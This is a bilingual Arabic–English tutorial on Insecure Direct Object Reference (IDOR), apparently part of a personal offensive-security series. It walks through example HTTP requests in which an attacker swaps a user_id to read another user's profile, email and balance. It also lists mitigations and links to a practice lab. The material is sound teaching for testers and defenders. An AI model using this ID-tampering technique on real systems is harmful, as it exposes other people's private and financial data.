# 1 - استغلال المعرّفات الموثوقة – (21)

# 1 - Exploiting Trusted Identifiers – (21)

---

## الجزء الأول: النص بالعربي

### الوصف:

استغلال معرفات يثق بها النظام (مثل user_id، order_id، file_id) دون التحقق من ملكيتها للمستخدم الحالي. يُعرف غالبًا بـ Insecure Direct Object Reference (IDOR).

### العملي:

يحصل المهاجم على معرف خاص به (مثل user_id=1001)، ثم يعدله إلى معرف آخر (مثل 5678) في الطلب.

#### الطلب (http request):

```bash
GET /api/profile?user_id=1001 HTTP/1.1
Host: app.example.com
Cookie: session=abc123xyz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### الرد (http response):

```bash
HTTP/1.1 200 OK
Content-Type: application/json

{
  "user_id": 1001,
  "name": "Your Name",
  "email": "you@example.com",
  "balance": 2500.00
}
```

#### تعديل المهاجم (http request):

```bash
GET /api/profile?user_id=5678 HTTP/1.1
Host: app.example.com
Cookie: session=abc123xyz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### الرد بعد تعديل المهاجم (http response):

```bash
HTTP/1.1 200 OK
Content-Type: application/json

{
  "user_id": 5678,
  "name": "Victim Name",
  "email": "victim@company.com",
  "balance": 85000.00
}
```

### سيناريو واقعي:

في bug bounty reports (HackerOne وMedium، 2022–2025)، يغير الباحث user_id أو account_id في /profile أو /account/details، فيطلع بيانات PII (إيميل، جوال، رصيد).  
bounties تصل إلى 3,500$–10,000$+ (تصنيف Critical).

#### الطلب (http request) - من حالة مشابهة (IDOR في profile):

```bash
GET /user/details?id=12345 HTTP/1.1
Host: redacted.com
```

#### الرد (http response):

```bash
HTTP/1.1 200 OK
{ "name": "Victim", "phone": "010xxxxxxxx" }
```

#### تعديل المهاجم (http request):

```bash
GET /user/details?id=67890 HTTP/1.1
Host: redacted.com
```

#### الرد بعد تعديل المهاجم (http response):

```bash
HTTP/1.1 200 OK
{ "name": "Another Victim", "phone": "011yyyyyyyy" }
```

### الخطورة:

حرجة (Critical/P1) – تسريب PII، تعديل/حذف، تأثير مالي.

### آليات الحماية:

- تحقق server-side:  
  `if current_user.id != resource.owner_id → 403`
- استخدم UUID أو hashed references غير متسلسلة.
- لا تعرض IDs حساسة في client-side.
- استخدم frameworks مع built-in object authorization (مثل Spring Security @PreAuthorize).

### المعمل الأول لتجربة (Lab1 Trusted-ID):

- ملفات المعمل متاحة هنا:  
  https://github.com/ItsS4LEH/offensive-security-journey/tree/main/S4PwnLab/Trusted-ID-Exploit/Lab1-Trusted-ID

---

## Part 2: The Text in English

### Description:

Exploiting identifiers trusted by the system (such as user_id, order_id, file_id) without verifying their ownership for the current user. This is commonly known as Insecure Direct Object Reference (IDOR).

### Practical:

The attacker obtains an identifier belonging to them (such as user_id=1001), then modifies it to another identifier (such as 5678) in the request.

#### Request (http request):

```bash
GET /api/profile?user_id=1001 HTTP/1.1
Host: app.example.com
Cookie: session=abc123xyz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### Response (http response):

```bash
HTTP/1.1 200 OK
Content-Type: application/json

{
  "user_id": 1001,
  "name": "Your Name",
  "email": "you@example.com",
  "balance": 2500.00
}
```

#### Attacker modification (http request):

```bash
GET /api/profile?user_id=5678 HTTP/1.1
Host: app.example.com
Cookie: session=abc123xyz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### Response after attacker modification (http response):

```bash
HTTP/1.1 200 OK
Content-Type: application/json

{
  "user_id": 5678,
  "name": "Victim Name",
  "email": "victim@company.com",
  "balance": 85000.00
}
```

### Real-world scenario:

In bug bounty reports (HackerOne and Medium, 2022–2025), the researcher changes user_id or account_id in /profile or /account/details and retrieves PII data (email, phone, balance).  
Bounties reach $3,500–$10,000+ (Critical classification).

#### Request (http request) - from a similar case (IDOR in profile):

```bash
GET /user/details?id=12345 HTTP/1.1
Host: redacted.com
```

#### Response (http response):

```bash
HTTP/1.1 200 OK
{ "name": "Victim", "phone": "010xxxxxxxx" }
```

#### Attacker modification (http request):

```bash
GET /user/details?id=67890 HTTP/1.1
Host: redacted.com
```

#### Response after attacker modification (http response):

```bash
HTTP/1.1 200 OK
{ "name": "Another Victim", "phone": "011yyyyyyyy" }
```

### Severity:

Critical (Critical/P1) – PII leakage, modification/deletion, financial impact.

### Protection Mechanisms:

- Server-side validation:  
  `if current_user.id != resource.owner_id → 403`
- Use UUID or non-sequential hashed references.
- Do not expose sensitive IDs in the client-side.
- Use frameworks with built-in object authorization (such as Spring Security @PreAuthorize).

### First Lab for Practice (Lab1 Trusted-ID):

- Lab files available here:  
  https://github.com/ItsS4LEH/offensive-security-journey/tree/main/S4PwnLab/Trusted-ID-Exploit/Lab1-Trusted-ID
